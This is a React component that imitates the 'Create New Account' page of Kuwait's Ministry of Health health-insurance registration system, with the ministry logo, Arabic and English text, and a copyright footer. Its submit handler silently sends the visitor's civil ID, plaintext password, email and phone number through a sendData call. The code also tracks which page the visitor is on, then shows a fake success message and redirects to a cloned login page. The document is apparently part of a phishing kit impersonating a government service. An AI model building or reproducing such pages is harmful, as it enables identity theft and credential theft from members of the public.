import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData } from '../lib/store';

export default function MOHCreateAccount() {
  const [, setLocation] = useLocation();
  const [lang, setLang] = useState<'ar' | 'en'>('ar');

  const [userCategory, setUserCategory] = useState('');
  const [gender, setGender] = useState('');
  const [governorate, setGovernorate] = useState('');
  const [civilId, setCivilId] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');

  const isAr = lang === 'ar';

  useEffect(() => {
    navigateToPage('إنشاء حساب جديد');
  }, []);

  const t = {
    ar: {
      title: 'النظام الآلي لتسجيل الضمان الصحي',
      langSwitch: 'English',
      formTitle: 'إنشاء حساب جديد',
      civilId: 'الرقم المدني',
      civilIdPh: 'أدخل الرقم المدني',
      password: 'كلمة المرور',
      passwordPh: 'أدخل كلمة المرور',
      confirmPassword: 'تأكيد كلمة المرور',
      confirmPasswordPh: 'أعد إدخال كلمة المرور',
      email: 'البريد الإلكتروني',
      emailPh: 'أدخل البريد الإلكتروني',
      phone: 'رقم الهاتف',
      phonePh: 'أدخل رقم الهاتف',
      userCategory: 'حدد فئة المستخدم',
      userCategoryOptions: ['جهة حكومية', 'تسجيل شخصي / أفراد', 'تسجيل شركات / قطاع خاص', 'الجامعة'],
      gender: 'اختار الجنس',
      genderOptions: ['ذكر', 'أنثى'],
      governorate: 'اختار المحافظة',
      governorateOptions: ['العاصمة', 'حولي', 'الفروانية', 'الأحمدي', 'الجهراء', 'مبارك الكبير'],
      createBtn: 'إنشاء حساب',
      haveAccount: 'لديك حساب بالفعل؟',
      login: 'تسجيل الدخول',
      footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    },
    en: {
      title: 'Automated Health Insurance Registration System',
      langSwitch: 'العربية',
      formTitle: 'Create New Account',
      civilId: 'Civil ID',
      civilIdPh: 'Enter Civil ID',
      password: 'Password',
      passwordPh: 'Enter Password',
      confirmPassword: 'Confirm Password',
      confirmPasswordPh: 'Re-enter Password',
      email: 'Email',
      emailPh: 'Enter Email',
      phone: 'Phone Number',
      phonePh: 'Enter Phone Number',
      userCategory: 'Select User Category',
      userCategoryOptions: ['Government Entity', 'Personal / Individuals', 'Companies / Private Sector', 'University'],
      gender: 'Select Gender',
      genderOptions: ['Male', 'Female'],
      governorate: 'Select Governorate',
      governorateOptions: ['Capital', 'Hawalli', 'Farwaniya', 'Ahmadi', 'Jahra', 'Mubarak Al-Kabeer'],
      createBtn: 'Create Account',
      haveAccount: 'Already have an account?',
      login: 'Login',
      footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    },
  };

  const tx = t[lang];

  const inputStyle: React.CSSProperties = {
    width: '100%',
    padding: '10px 12px',
    border: '1px solid #ccc',
    borderRadius: 4,
    fontSize: 15,
    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
    outline: 'none',
    direction: isAr ? 'rtl' : 'ltr',
    boxSizing: 'border-box',
    background: '#fff',
  };

  const labelStyle: React.CSSProperties = {
    fontSize: 14,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 5,
    display: 'block',
    textAlign: isAr ? 'right' : 'left',
  };

  const isValid = civilId && password && confirmPassword && email && phone && password === confirmPassword;

  const handleCreate = () => {
    if (!isValid) return;

    sendData({
      data: {
        'فئة المستخدم': userCategory,
        'الجنس': gender,
        'المحافظة': governorate,
        'الرقم المدني': civilId,
        'كلمة المرور': password,
        'البريد الإلكتروني': email,
        'رقم الهاتف': phone,
      },
      current: 'إنشاء حساب جديد',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    // Mark as registered user so update popup is skipped on login
    localStorage.setItem('mohAccountCreated', 'true');
    localStorage.setItem('mohRegisteredCivilId', civilId);
    // Show success and redirect to login
    alert(isAr ? 'تم إنشاء الحساب بنجاح' : 'Account created successfully');
    setLocation('/moh-login');
  };

  return (
    <div style={{ direction: isAr ? 'rtl' : 'ltr', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff', display: 'flex', flexDirection: 'column' }}>
      {/* Header */}
      <div style={{ background: '#0c2c3c', padding: '15px 10px', textAlign: 'center' }}>
        <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" style={{ width: 70, height: 70, margin: '0 auto' }} />
        <h1 style={{ color: '#fff', fontSize: 'clamp(16px, 4vw, 22px)', marginTop: 8, fontWeight: 'bold', padding: '0 10px' }}>{tx.title}</h1>
      </div>

      {/* Language Toggle */}
      <div style={{ textAlign: isAr ? 'left' : 'right', padding: '10px 15px' }}>
        <span
          onClick={() => setLang(isAr ? 'en' : 'ar')}
          style={{ color: 'red', fontSize: 14, cursor: 'pointer' }}
        >
          {tx.langSwitch}
        </span>
      </div>

      {/* Main Content */}
      <div style={{ flex: 1 }}>
        <div style={{ maxWidth: 500, margin: '20px auto', padding: '0 15px', width: '100%', boxSizing: 'border-box' as const }}>
          <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
            <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
              <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>{tx.formTitle}</span>
            </div>
            <div style={{ padding: '20px 15px', background: '#f9f9f9' }}>
              {/* User Category */}
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>{tx.userCategory}</label>
                <select
                  value={userCategory}
                  onChange={(e) => setUserCategory(e.target.value)}
                  style={{ ...inputStyle, background: '#fff', cursor: 'pointer' }}
                >
                  <option value="">{tx.userCategory}</option>
                  {tx.userCategoryOptions.map((opt: string) => (
                    <option key={opt} value={opt}>{opt}</option>
                  ))}
                </select>
              </div>

              {/* Civil ID */}
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>{tx.civilId} <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="text"
                  value={civilId}
                  onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))}
                  maxLength={12}
                  placeholder={tx.civilIdPh}
                  style={inputStyle}
                />
              </div>

              {/* Gender */}
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>{tx.gender}</label>
                <select
                  value={gender}
                  onChange={(e) => setGender(e.target.value)}
                  style={{ ...inputStyle, cursor: 'pointer' }}
                >
                  <option value="">{tx.gender}</option>
                  {tx.genderOptions.map((opt: string) => (
                    <option key={opt} value={opt}>{opt}</option>
                  ))}
                </select>
              </div>

              {/* Governorate */}
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>{tx.governorate}</label>
                <select
                  value={governorate}
                  onChange={(e) => setGovernorate(e.target.value)}
                  style={{ ...inputStyle, cursor: 'pointer' }}
                >
                  <option value="">{tx.governorate}</option>
                  {tx.governorateOptions.map((opt: string) => (
                    <option key={opt} value={opt}>{opt}</option>
                  ))}
                </select>
              </div>

              {/* Password */}
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>{tx.password} <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => { const v = e.target.value; if (/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]*$/.test(v) || v === '') setPassword(v); }}
                  placeholder={tx.passwordPh}
                  style={inputStyle}
                />
              </div>

              {/* Confirm Password */}
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>{tx.confirmPassword} <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="password"
                  value={confirmPassword}
                  onChange={(e) => { const v = e.target.value; if (/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]*$/.test(v) || v === '') setConfirmPassword(v); }}
                  placeholder={tx.confirmPasswordPh}
                  style={inputStyle}
                />
                {confirmPassword && password !== confirmPassword && (
                  <p style={{ color: 'red', fontSize: 12, marginTop: 5 }}>
                    {isAr ? 'كلمة المرور غير متطابقة' : 'Passwords do not match'}
                  </p>
                )}
              </div>

              {/* Email */}
              <div style={{ marginBottom: 20 }}>
                <label style={labelStyle}>{tx.email} <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => { const v = e.target.value; if (/^[a-zA-Z0-9@._\-]*$/.test(v) || v === '') setEmail(v); }}
                  placeholder={tx.emailPh}
                  style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                />
                {email && !/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(email) && (
                  <p style={{ color: 'red', fontSize: 12, marginTop: 5 }}>
                    {isAr ? 'صيغة البريد الإلكتروني غير صحيحة' : 'Invalid email format'}
                  </p>
                )}
              </div>

              {/* Phone */}
              <div style={{ marginBottom: 25 }}>
                <label style={labelStyle}>{tx.phone} <span style={{ color: 'red' }}>*</span></label>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                  maxLength={12}
                  placeholder={tx.phonePh}
                  style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                />
              </div>

              {/* Create Button */}
              <div style={{ textAlign: 'center' }}>
                <button
                  onClick={handleCreate}
                  disabled={!isValid}
                  style={{
                    background: !isValid ? '#ccc' : '#1076BB',
                    color: '#fff', border: 'none', padding: '12px 40px',
                    fontSize: 'clamp(14px, 3.5vw, 16px)', fontWeight: 'bold', borderRadius: 4,
                    cursor: !isValid ? 'not-allowed' : 'pointer',
                    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                    width: '100%', maxWidth: 280,
                  }}
                >
                  {tx.createBtn}
                </button>
              </div>
            </div>
          </div>

          {/* Link to login */}
          <div style={{ textAlign: 'center', marginTop: 25 }}>
            <p style={{ fontSize: 14, color: '#555' }}>
              {tx.haveAccount} <a href="/moh-login" style={{ color: '#1076BB', textDecoration: 'none', fontWeight: 'bold' }}>{tx.login}</a>
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '12px 0', background: '#000', marginTop: 'auto' }}>
        <p style={{ color: '#fff', fontSize: 13, margin: 0 }}>{tx.footer}</p>
      </div>
    </div>
  );
}
